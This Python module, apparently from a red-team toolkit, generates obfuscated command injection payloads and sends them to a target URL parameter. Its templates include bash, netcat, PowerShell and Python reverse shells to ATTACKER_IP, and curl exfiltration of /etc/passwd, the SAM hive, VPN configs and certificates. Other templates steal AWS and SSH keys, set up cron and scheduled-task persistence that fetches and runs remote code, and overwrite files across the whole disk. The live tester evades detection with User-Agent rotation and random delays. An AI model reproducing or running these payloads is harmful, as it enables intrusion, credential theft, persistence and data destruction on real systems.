# modules/command.py
# Advanced Command Injection payload generator and live tester for red team operations

from colorama import Fore, Style
import random
import requests
import urllib.parse
import time
from typing import List, Dict, Any
from utils.encoders import apply_all_bypasses

# ──────────────────────────────────────────────
# Command separators - expanded for maximum bypass coverage
# ──────────────────────────────────────────────
SEPARATORS = {
    "linux": [
        ";", "&&", "||", "&", "|", "\n", "`", "$( )", "%0a", "%0d%0a",
        ";${IFS}", ";$IFS", ";&", "; |", ";&&", "\t", "%09", " | ", " || ", " && "
    ],
    "windows": [
        "&", "&&", "||", "|", "^", "\n", "%0a", "%0d%0a", ";&", "^&", "^|",
        "%1b", "\r\n", " | ", " || ", " && ", " & ", "^ "
    ],
    "both": [
        ";", "&&", "||", "&", "|", "\n", "`", "$( )", "%0a", "%0d%0a", "%09",
        "\t", ";${IFS}", " | ", " || ", " && ", " & "
    ]
}

# ──────────────────────────────────────────────
# Fingerprint & recon commands - expanded & realistic
# ──────────────────────────────────────────────
FINGERPRINT_COMMANDS = {
    "linux": [
        "whoami", "id", "uname -a", "cat /etc/os-release", "cat /proc/version",
        "hostname", "which curl || which wget", "lsb_release -a", "cat /etc/passwd | grep -v nologin",
        "find / -name .ssh 2>/dev/null | head -n 5", "env", "ps aux | head", "netstat -tuln",
        "cat /proc/cpuinfo | grep name", "uptime"
    ],
    "windows": [
        "whoami", "whoami /all", "ver", "systeminfo", "ipconfig /all", "net user",
        "net localgroup administrators", "cmd /c echo %PATH%", "powershell -c \"Get-ChildItem Env:\"",
        "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
        "powershell -c \"Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'\"",
        "wmic os get caption,version", "tasklist", "netstat -ano"
    ]
}

# ──────────────────────────────────────────────
# Payload goals - massively expanded for real red team impact (2025–2026)
# ──────────────────────────────────────────────
PAYLOAD_TEMPLATES = [
    # Fingerprint & recon
    {"goal": "fingerprint", "payload": "{cmd}", "desc": "Raw command execution test"},
    {"goal": "fingerprint", "payload": "{sep}{cmd}", "desc": "No-space separator variant"},
    {"goal": "fingerprint", "payload": "{sep} {cmd} 2>/dev/null", "desc": "Linux silent output"},
    {"goal": "fingerprint", "payload": "{sep}{cmd}>nul 2>&1", "desc": "Windows silent output"},

    # Reverse shells (replace ATTACKER_IP/PORT in real ops)
    {"goal": "revshell", "payload": "bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"", "desc": "Bash TCP reverse shell"},
    {"goal": "revshell", "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f", "desc": "Netcat mkfifo reverse shell"},
    {"goal": "revshell", "payload": "powershell -nop -exec bypass -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", "desc": "Nishang-style PowerShell reverse shell"},
    {"goal": "revshell", "payload": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", "desc": "Python reverse shell"},

    # File exfiltration
    {"goal": "exfil", "payload": "cat /etc/passwd | base64 | curl -d @- http://ATTACKER_IP:8000", "desc": "/etc/passwd exfil via curl"},
    {"goal": "exfil", "payload": "type %WINDIR%\\system32\\config\\SAM | %windir%\\system32\\certutil.exe -encode -f - | curl -d @- http://ATTACKER_IP:8000", "desc": "SAM hive exfil via certutil"},
    {"goal": "exfil", "payload": "find / -name *.ovpn -type f -exec cat {} + 2>/dev/null | base64 | curl -d @- http://ATTACKER_IP:8000", "desc": "VPN config steal"},
    {"goal": "exfil", "payload": "powershell -c \"Get-ChildItem -Recurse -Include *.kdbx,*.rdp | Select-String -Pattern 'password' | Out-File -FilePath temp.txt; curl -d @temp.txt http://ATTACKER_IP:8000\"", "desc": "KeePass/RDP file search + exfil"},

    # Credential harvesting
    {"goal": "creds", "payload": "cat ~/.aws/credentials ~/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null", "desc": "AWS & SSH key theft"},
    {"goal": "creds", "payload": "dir /s /b %USERPROFILE%\\*.kdbx %USERPROFILE%\\*.rdp %APPDATA%\\*.config", "desc": "KeePass & RDP files enumeration"},
    {"goal": "creds", "payload": "find / -name *.p12 -o -name *.pfx -type f 2>/dev/null | xargs -I {} cat {} | base64 | curl -d @- http://ATTACKER_IP:8000", "desc": "Certificate file exfil"},

    # Persistence
    {"goal": "persist", "payload": "(crontab -l; echo \"* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1\") | crontab -", "desc": "Evil cronjob persistence"},
    {"goal": "persist", "payload": "schtasks /create /tn EvilTask /tr \"powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1'))\" /sc minute /mo 1 /ru SYSTEM", "desc": "SYSTEM-level scheduled task"},

    # Ransomware / destructive placeholders
    {"goal": "ransom", "payload": "find / -type f -not -path \"/proc/*\" -not -path \"/sys/*\" -exec sh -c 'echo locked > {}' \\;", "desc": "Fake ransomware touch (test only)"},
    {"goal": "ransom", "payload": "powershell -c \"Get-ChildItem -Recurse -File | ForEach { echo 'ENCRYPTED' > $_.FullName }\"", "desc": "Fake file overwrite (test only)"},

    # Lateral movement / discovery
    {"goal": "discovery", "payload": "net view /all", "desc": "Windows network discovery"},
    {"goal": "discovery", "payload": "smbclient -L //localhost -N", "desc": "SMB share enumeration"},
    {"goal": "discovery", "payload": "arp -a", "desc": "ARP table dump"},
]

def generate_command_payloads(
    os_type: str = "both",
    goal: str = "all",
    encode_type: str = None,
    double_encode: bool = False,
    obfuscate: bool = True
) -> List[Dict[str, Any]]:
    """
    Generate large set of command injection payloads with variants.
    Returns list of dicts ready for testing or export.
    """
    payloads = []
    separators = SEPARATORS.get(os_type, SEPARATORS["both"])
    templates = PAYLOAD_TEMPLATES if goal == "all" else [t for t in PAYLOAD_TEMPLATES if t["goal"] == goal]

    for item in templates:
        cmd = random.choice(FINGERPRINT_COMMANDS.get(os_type, FINGERPRINT_COMMANDS["linux"])) if "{cmd}" in item["payload"] else ""
        base = item["payload"].replace("{cmd}", cmd)

        for sep in separators:
            variants = [
                base,
                f"{sep}{base}",
                f"{sep} {base}",
                f"{sep}{base} 2>/dev/null" if "linux" in os_type or os_type == "both" else f"{sep}{base}>nul 2>&1",
                f"`{base}`",
                f"$({base})",
                f"({base})",
                f"|{base}",
                f"||{base}",
                f"&&{base}"
            ]

            for variant in variants:
                processed = apply_all_bypasses(
                    payload=variant,
                    encode_type=encode_type,
                    double_encode=double_encode,
                    obfuscate=obfuscate,
                    case_manip=True,
                    keywords=["bash", "nc", "curl", "wget", "powershell", "certutil", "schtasks", "crontab", "whoami", "id", "net", "tasklist"]
                )
                payloads.append({
                    "payload": processed,
                    "goal": item["goal"],
                    "description": f"{item['desc']} | Separator: '{sep}' | OS: {os_type.upper()}",
                    "original": variant
                })

    random.shuffle(payloads)
    return payloads


def run_live_command(
    base_url: str,
    param: str,
    payloads: List[Dict[str, Any]],
    delay: float = 1.2,
    timeout: int = 15,
    proxies: Dict = None
) -> List[Dict[str, Any]]:
    """
    Execute live command injection testing with improved detection.
    Returns list of confirmed/potential command execution findings.
    """
    print(f"\n{Fore.RED}Starting command injection testing → {base_url}?{param}=[PAYLOAD]{Style.RESET_ALL}")
    print(f"Testing {len(payloads)} payloads. Progress shown live.\n")

    session = requests.Session()
    session.headers.update({
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ])
    })

    if proxies:
        session.proxies = proxies

    findings = []
    total = len(payloads)

    linux_indicators = [
        "uid=", "gid=", "groups=", "root", "/bin/bash", "nc -", "curl http", "wget http",
        "Linux version", "/etc/passwd", "cron", "crontab:"
    ]
    windows_indicators = [
        "powershell", "certutil", "NT AUTHORITY\\SYSTEM", "Administrators",
        "Microsoft Windows", "cmd.exe", "schtasks", "whoami /all"
    ]

    all_indicators = linux_indicators + windows_indicators

    for idx, entry in enumerate(payloads, 1):
        payload = entry["payload"]
        try:
            target_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            response = session.get(target_url, timeout=timeout, verify=False)

            status_str = f"{Fore.GREEN}{response.status_code}{Style.RESET_ALL}" if response.status_code == 200 else \
                         f"{Fore.YELLOW}{response.status_code}{Style.RESET_ALL}"

            os_hint = ""
            if any(ind.lower() in response.text.lower() for ind in linux_indicators):
                os_hint = f"{Fore.CYAN}LINUX EXECUTION{Style.RESET_ALL}"
            elif any(ind.lower() in response.text.lower() for ind in windows_indicators):
                os_hint = f"{Fore.CYAN}WINDOWS EXECUTION{Style.RESET_ALL}"
            else:
                os_hint = "clean"

            print(f"  [{idx:3d}/{total:3d}]  {payload[:65]:<65} → Status: {status_str} | {os_hint}")

            if os_hint != "clean":
                print(f"  {Fore.RED}→ Command execution confirmed – Goal: {entry['goal']}{Style.RESET_ALL}")
                findings.append({
                    "url": target_url,
                    "payload": payload,
                    "goal": entry["goal"],
                    "description": entry.get("description", "Command Injection"),
                    "status": "Potential Command Execution",
                    "status_code": response.status_code,
                    "reason": "OS-specific execution indicator found",
                    "os_hint": "Linux" if "LINUX" in os_hint else "Windows" if "WINDOWS" in os_hint else "Unknown"
                })

            time.sleep(delay + random.uniform(0.5, 2.5))

        except requests.exceptions.RequestException as exc:
            print(f"  [{idx:3d}/{total:3d}]  {payload[:65]:<65} → {Fore.YELLOW}Request failed: {str(exc)[:60]}{Style.RESET_ALL}")

    return findings


def get_payloads_for_export(payloads: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Prepare payload list for export (json/txt/html)."""
    return [{
        "payload": p["payload"],
        "goal": p["goal"],
        "description": p.get("description", "Command Injection payload"),
        "original": p.get("original", ""),
        "type": "Command Injection"
    } for p in payloads]


if __name__ == "__main__":
    print("This is a module — use main.py to execute.")